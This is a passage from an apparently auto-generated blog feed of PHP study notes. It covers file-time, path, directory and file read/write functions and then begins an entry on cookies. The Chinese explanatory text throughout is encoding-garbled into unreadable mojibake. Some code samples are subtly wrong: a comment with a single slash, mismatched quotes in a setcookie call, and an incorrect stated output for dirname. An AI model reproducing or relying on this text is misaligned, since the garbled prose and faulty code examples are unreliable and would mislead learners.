falseã€‚æ—¶é—´ä»¥ Unix æ—¶é—´æˆ³çš„æ–¹å¼è¿”å›ã€‚</p><p>6.<code>filemtime()</code><br>è·å–æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: filemtime(filename)<br></code></pre></td></tr></table></figure><p>è¿”å›æ–‡ä»¶ä¸­çš„æ•°æ®å—ä¸Šæ¬¡è¢«å†™å…¥çš„æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ–‡ä»¶çš„å†…å®¹ä¸Šæ¬¡è¢«ä¿®æ”¹çš„æ—¶é—´ã€‚</p><p>7.<code>fileatime()</code><br>è·å–æŒ‡å®šæ–‡ä»¶çš„ä¸Šæ¬¡ inode ä¿®æ”¹æ—¶é—´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: fileatime(filename)<br></code></pre></td></tr></table></figure><p>è¿”å›æ–‡ä»¶ä¸Šæ¬¡ inode è¢«ä¿®æ”¹çš„æ—¶é—´ã€‚å¦‚æœå‡ºé”™åˆ™è¿”å› falseã€‚æ—¶é—´ä»¥ Unix æ—¶é—´æˆ³çš„æ–¹å¼è¿”å›ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">fileatimeã€filemtimeä¸filectimeåŒºåˆ«<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1.txt&quot;</span>;<br>outputFileTestInfo( <span class="hljs-variable">$file</span> );<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">outputFileTestInfo</span>(<span class="hljs-params"> <span class="hljs-variable">$f</span> </span>)</span>&#123;<br>   <span class="hljs-keyword">if</span> ( ! file_exists( <span class="hljs-variable">$f</span> ) )&#123;<br>       <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> does not exist&lt;BR&gt;&quot;</span>;<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was accessed on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, fileatime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was modified on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, filemtime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was changed on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, filectime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¾“å‡ºï¼š</span><br><span class="hljs-comment">1.txt was accessed on Sun 13 Sep 2020 7:16 PM</span><br><span class="hljs-comment">1.txt was modified on Sun 13 Sep 2020 5:23 PM</span><br><span class="hljs-comment">1.txt was changed on Sun 13 Sep 2020 7:16 PM</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>8.<code>stat()</code><br>è·å–æ–‡ä»¶å¤§éƒ¨åˆ†å±æ€§å€¼</p><h2 id="ä¸‰ã€ç›®å½•çš„åŸºæœ¬æ“ä½œ"><a href="#ä¸‰ã€ç›®å½•çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="ä¸‰ã€ç›®å½•çš„åŸºæœ¬æ“ä½œ"></a>ä¸‰ã€ç›®å½•çš„åŸºæœ¬æ“ä½œ</h2><p>1.<code>basename()</code><br>è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•:basename(path)æˆ–basename(path,æ–‡ä»¶æ‹“å±•å)  <br></code></pre></td></tr></table></figure><p>ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;demo/test.php&quot;</span>;<br><span class="hljs-comment">//Show filename with file extension</span><br><span class="hljs-keyword">echo</span> basename(<span class="hljs-variable">$path</span>) .<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;  <span class="hljs-comment">//è¾“å‡ºtest.php</span><br>/Show filename without file extension<br><span class="hljs-keyword">echo</span> basename(<span class="hljs-variable">$path</span>,<span class="hljs-string">&quot;.php&quot;</span>);   <span class="hljs-comment">//è¾“å‡º test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.<code>dirname()</code><br>è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼š dirname(path)<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> dirname(<span class="hljs-string">&quot;c:/testweb/home.php&quot;</span>);  <span class="hljs-comment">//è¾“å‡ºc:/testweb</span><br><span class="hljs-keyword">echo</span> dirname(<span class="hljs-string">&quot;/testweb/home.php&quot;</span>);   <span class="hljs-comment">//è¾“å‡ºtestweb</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>3.<code>pathinfo()</code><br>ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼š pathinfo(path,options)<br></code></pre></td></tr></table></figure><p>ç”¨æ³•ï¼š<br>pathinfo() è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„åŒ…å«æœ‰ path çš„ä¿¡æ¯ã€‚åŒ…æ‹¬ä»¥ä¸‹çš„æ•°ç»„å…ƒç´ ï¼š[dirname]ï¼ˆ ç›®å½•è·¯å¾„ï¼‰ã€[basename] (æ–‡ä»¶å)ã€[extension]: (æ–‡ä»¶åç¼€å)ã€[filename] (ä¸åŒ…å«åç¼€çš„æ–‡ä»¶å)ã€‚<br>å…¶ä¸­optionsä¸ºè§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚<br>è‹¥å‡ºç°<code>PATHINFO_DIRNAME</code> ï¼Œ åˆ™åªè¿”å› dirname<br>è‹¥å‡ºç°<code>PATHINFO_BASENAME</code> ï¼Œ åˆ™åªè¿”å› basename<br>è‹¥å‡ºç°<code>PATHINFO_EXTENSION</code> ï¼Œåˆ™åªè¿”å› extension</p><p>ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(pathinfo(<span class="hljs-string">&quot;index.html&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Array ( [dirname] =&gt; . [basename] =&gt; index.html [extension] =&gt; html [filename] =&gt; index )<br></code></pre></td></tr></table></figure><p>4.<code>opendir()</code><br>æ‰“å¼€ç›®å½•å¥æŸ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šopendir(path);<br><span class="hljs-comment">//pathä¸ºè§„å®šè¦æ‰“å¼€çš„ç›®å½•è·¯å¾„ã€‚ã€‚</span><br></code></pre></td></tr></table></figure><p>5.<code>readdir()</code><br>ä»ç›®å½•å¥æŸ„ä¸­è¯»å–æ¡ç›®,è¿”å›ç›®å½•ä¸­ä¸‹ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">readdir(dir_handle);<br><span class="hljs-comment">//dir_handleæŒ‡å®šä¹‹å‰ç”± opendir() æ‰“å¼€çš„ç›®å½•å¥æŸ„èµ„æºã€‚å¦‚æœè¯¥å‚æ•°æœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨æœ€åä¸€ä¸ªç”± opendir() æ‰“å¼€çš„é“¾æ¥ã€‚</span><br></code></pre></td></tr></table></figure><p>6.<code>rewinddir()</code><br>å€’å›ç›®å½•å¥æŸ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šrewinddir(dir_handle);<br><span class="hljs-comment">//rewinddir() å‡½æ•°é‡ç½®ç”± opendir() åˆ›å»ºçš„ç›®å½•å¥æŸ„ã€‚</span><br></code></pre></td></tr></table></figure><p>7.<code>closedir()</code><br>å…³é—­ç›®å½•å¥æŸ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šclosedir(dir_handle);<br></code></pre></td></tr></table></figure><p>8.<code>mkdir()</code><br>æ–°å»ºç›®å½•ï¼Œå¦‚æœæˆåŠŸè¯¥å‡½æ•°è¿”å› trueï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šmkdir(path,mode,recursive)<br></code></pre></td></tr></table></figure><p>9.<code>rmdir()</code><br>åˆ é™¤æŒ‡å®šçš„ç©ºç›®å½•ï¼Œå¦‚æœæˆåŠŸè¯¥å‡½æ•°è¿”å› trueï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šrmdir(dir)<br></code></pre></td></tr></table></figure><p>10.<code>scandir()</code><br>è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šscandir(<span class="hljs-built_in">directory</span>,sorting_order);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">directoryä¸ºè¦æ‰«æçš„ç›®å½•ã€‚</span><br><span class="hljs-comment">sorting_orderä¸ºæ’åˆ—é¡ºåºã€‚é»˜è®¤æ˜¯ 0ï¼Œè¡¨ç¤ºæŒ‰å­—æ¯å‡åºæ’åˆ—ã€‚</span><br><span class="hljs-comment">å¦‚æœè®¾ç½®ä¸º sorting_order_descending æˆ–è€… 1ï¼Œåˆ™è¡¨ç¤ºæŒ‰å­—æ¯é™åºæ’åˆ—ã€‚</span><br><span class="hljs-comment">å¦‚æœè®¾ç½®ä¸º sorting_order_noneï¼Œåˆ™è¿”å›æœªæ’åˆ—çš„ç»“æœã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="å››ã€æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ"><a href="#å››ã€æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å››ã€æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ"></a>å››ã€æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ</h2><p>1.<code>fopen():</code> æ‰“å¼€æ–‡ä»¶æˆ–è€… URL<br>  fopen()å‡½æ•°çš„å‚æ•°æ˜¯ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„å’Œæ–‡ä»¶çš„è¯»å†™æ¨¡å¼ï¼›åŒæ—¶fopenå‡½æ•°ä¹Ÿä¼š     åœ¨æ‰“å¼€æ–‡ä»¶æ—¶å€™å‘ç°æ²¡æœ‰æ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æ¨¡å¼å¿…é¡»æ˜¯è¯»å†™æˆ–å†™å…¥çš„æ¨¡å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;D:/test/file.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//ä½¿ç”¨ç»å¯¹è·¯å¾„æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œé€‰æ‹©åªè¯»æ¨¡å¼ï¼Œå¹¶è¿”å›èµ„æº$file</span><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;http://www.test.com&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼Œä½¿ç”¨httpåè®®åªèƒ½ä»¥è¯»çš„æ–¹å¼æ‰“å¼€</span><br></code></pre></td></tr></table></figure><p>2<code>.fread()</code>:è¯»å–æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;file.txt&quot;</span>));<br></code></pre></td></tr></table></figure><p>fread()å‡½æ•°çš„å‚æ•°æ˜¯éœ€è¦è¯»å–çš„æ–‡ä»¶å’Œæ–‡ä»¶è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°</p><p>3.<code>fgets():</code>ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fgets(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>è¯»å–æ–‡ä»¶ä¸­çš„å•è¡Œæ–‡å­—ï¼Œæ²¡è¯»å–ä¸€æ¬¡å°±ä¼šå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€è¡Œçš„é¦–éƒ¨</p><p><code> fgetc()</code>:è¯»å–å•ä¸ªå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fgetc(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>fgetc()å‡½æ•°å°†ä¼šé€ä¸ªå­—ç¬¦çš„è¯»å–å†…å®¹è¾“å‡ºï¼›</p><p><code>4.feof()</code>:æ£€æŸ¥æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°äº†æ–‡ä»¶ç»“æŸçš„ä½ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">feof(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>feof()å‡½æ•°çš„ä¸»è¦åŠŸèƒ½æ˜¯æ£€æŸ¥æ–‡ä»¶ä¸­çš„æŒ‡é’ˆæ˜¯å¦åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼Œå¯ä»¥å€Ÿæ­¤æ¥è§£å†³æœªçŸ¥å¤§å°çš„æ–‡ä»¶è¯»å†™é˜²æ­¢è¶Šç•Œçš„é—®é¢˜</p><p><code>5.fwrite()</code>:å†™å…¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fwrite(file,<span class="hljs-keyword">string</span>,length)<br></code></pre></td></tr></table></figure><p>fwrite() è¿”å›å†™å…¥çš„å­—ç¬¦æ•°ï¼Œå‡ºç°é”™è¯¯æ—¶åˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">echo</span> fwrite(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br>fclose(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¾“å‡º</span><br><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p>6.<code>rewind()</code><br>å€’å›æ–‡ä»¶æŒ‡é’ˆçš„ä½ç½®</p><p>7.<code>flock()</code><br>è½»ä¾¿çš„å’¨è¯¢æ–‡ä»¶é”å®š</p><p>8.<code>ftruncate()</code><br>å°†æ–‡ä»¶æˆªæ–­åˆ°ç»™å®šçš„é•¿åº¦</p><p>9.<code>fclose()</code>ï¼šå…³é—­ä¸€ä¸ªå·²æ‰“å¼€çš„æ–‡ä»¶æŒ‡é’ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fclose(file)<br></code></pre></td></tr></table></figure><p>file å‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ,fclose() å‡½æ•°å…³é—­è¯¥æŒ‡é’ˆæŒ‡å‘çš„æ–‡ä»¶ã€‚å¦‚æœæˆåŠŸåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>10.<code>file()</code> :æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file(path)<br></code></pre></td></tr></table></figure><p>file() å°†æ–‡ä»¶ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒéƒ½æ˜¯æ–‡ä»¶ä¸­ç›¸åº”çš„ä¸€è¡Œï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(file(<span class="hljs-string">&quot;test.txt&quot;</span>));<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//è¾“å‡º</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; Hello World [<span class="hljs-number">1</span>] =&gt; abc [<span class="hljs-number">2</span>] =&gt; fe [<span class="hljs-number">3</span>] =&gt; vdf )<br></code></pre></td></tr></table></figure><p>11.<code>copy()</code>ï¼šæ‹·è´æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">copy(source,destination)<br><span class="hljs-comment">//source ä¸ºè¦å¤åˆ¶çš„æ–‡ä»¶ï¼Œdestinationä¸ºå¤åˆ¶æ–‡ä»¶çš„ç›®çš„åœ°ã€‚</span><br></code></pre></td></tr></table></figure><p>å°†æ–‡ä»¶ä» source æ‹·è´åˆ° destinationã€‚å¦‚æœæˆåŠŸåˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> copy(<span class="hljs-string">&quot;a.txt&quot;</span>,<span class="hljs-string">&quot;b.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>12.<code>unlink()</code>ï¼šåˆ é™¤æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">unlink(filename)<br></code></pre></td></tr></table></figure><p>åˆ é™¤æ–‡ä»¶è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;test.txt&quot;</span>;<br><span class="hljs-keyword">if</span> (!unlink(<span class="hljs-variable">$file</span>))<br>  &#123;<br>  <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Error deleting <span class="hljs-subst">$file</span>&quot;</span>);<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>  <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Deleted <span class="hljs-subst">$file</span>&quot;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>13.<code>file_get_contents()</code>ï¼šå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contents(path)<br></code></pre></td></tr></table></figure><p>14.<code>file_put_contents()</code>ï¼šå°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_put_contents(file,data)<br></code></pre></td></tr></table></figure><p>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ä¸ä¾æ¬¡è°ƒç”¨ fopen()ï¼Œfwrite() ä»¥åŠ fclose() åŠŸèƒ½ä¸€æ ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> file_put_contents(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;Hello World!&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>15.<code>rename()</code>ï¼šé‡å‘½åä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">rename(oldname,newname)<br><span class="hljs-comment">//oldname è¦é‡å‘½åçš„æ–‡ä»¶æˆ–ç›®å½•ã€‚newname æ–‡ä»¶æˆ–ç›®å½•çš„æ–°åç§°ã€‚</span><br></code></pre></td></tr></table></figure><p>16.<code>readfile()</code>;è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">readfile(filename)<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> readfile(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¾“å‡º</span><br>Hello World!<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP cookieä¸session</title>
    <link href="/2020/09/03/PHP%20cookie%E4%B8%8Esession/"/>
    <url>/2020/09/03/PHP%20cookie%E4%B8%8Esession/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPå­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰</p> <a id="more"></a><p>ä¸€ã€cookie</p><blockquote><p>Cookieæ˜¯ç”¨æ¥å°†ç½‘ç«™çš„èµ„æ–™è®°å½•åœ¨å®¢æˆ·ç«¯çš„æŠ€æœ¯ï¼Œè¿™ç§æŠ€æœ¯è®©WlebæœåŠ¡å™¨èƒ½å°†ä¸€äº›èµ„æ–™ï¼Œå­˜æ”¾äºå®¢æˆ·ç«¯ï¼ˆç”¨æˆ·çš„ç”µè„‘ï¼‰ä¹‹ä¸­ã€‚<br>æ¯”å¦‚:å½“é€šè¿‡éªŒè¯,æˆåŠŸç™»å½•ç½‘ç«™åï¼Œåœ¨â€ç½‘é¡µä¸€â€œçš„PHPè„šæœ¬ä¸­ï¼Œä¼šæŠŠè¿™ä¸ªç”¨æˆ·<br>æœ‰å…³çš„ä¿¡æ¯ï¼Œè®¾ç½®åˆ°å®¢æˆ·ç«¯ç”µè„‘çš„Cookieä¸­ï¼Œå½“å†æ¬¡è®¿é—®åŒä¸€ä¸ªç½‘ç«™ä¸­çš„å…¶ä»–è„šæœ¬æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨æºå¸¦Cookieä¸­çš„æ•°æ®ä¸€èµ·è®¿é—®ï¼Œåœ¨æœåŠ¡å™¨ä¸­çš„æ¯ä¸ªè„šæœ¬ä¸­éƒ½å¯ä»¥æ¥å—Cookieä¸­çš„æ•°æ®ï¼Œä¸éœ€è¦æ¯è®¿é—®ä¸€ä¸ªé¡µé¢å°±é‡æ–°è¾“å…¥ä¸€æ¬¡ç™»å½•è€…çš„ä¿¡æ¯ã€‚</p></blockquote><ol><li>å‘å®¢æˆ·ç«¯ç”µè„‘ä¸­è®¾ç½®Cockie<br>PHPä¸­<code>setcookie()</code> å‡½æ•°ç”¨äºè®¾ç½® cookieã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//è¯­æ³•</span><br>setcookie(name, value, expire, path, domain);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200903161113188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>setcookie(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;zhangsan&quot;,time()+60*60);</span><br><span 